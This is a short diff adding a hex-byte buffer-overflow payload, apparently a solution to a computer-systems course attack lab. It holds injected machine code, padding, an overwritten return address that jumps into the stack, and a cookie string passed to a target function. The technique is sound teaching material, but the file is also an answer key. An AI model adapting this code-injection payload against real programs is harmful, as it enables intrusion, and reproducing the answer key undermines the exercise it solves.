@@ -1,0 +1,16 @@
+/* starts at 0x5561dc78, inject code here! */
+48 8d 7c 24 08          /* lea    0x8(%rsp),%rdi */
+c3                      /* ret */
+                  00 00 /* paddings to make 40 bytes */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* original return address */
+78 dc 61 55 00 00 00 00 /* jump to injected code */
+fa 18 40 00 00 00 00 00 /* new rsp, jump to touch3 */
+/* rsp + 8, hex format string of cookie */
+/* 59 b  9  9  7  f  a */
+35 39 62 39 39 37 66 61
+00 00 00 00 00 00 00 00 /* make extra padding */
